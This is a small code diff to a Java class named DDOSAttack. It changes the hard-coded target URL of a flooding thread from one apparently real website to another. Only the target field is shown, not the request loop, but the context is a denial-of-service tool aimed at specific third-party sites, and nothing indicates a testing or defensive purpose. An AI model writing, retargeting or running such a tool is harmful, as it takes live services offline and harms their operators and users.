@@ -17,7 +17,7 @@ public class DDOSAttack {
     public static class DdosThread extends Thread {
 
         private AtomicBoolean running = new AtomicBoolean(true);
-        private final String request = "https://www.mathemagics.art/";
+        private final String request = "https://www.bookaroom.app/";
         private final URL url;
 
         String param = null;
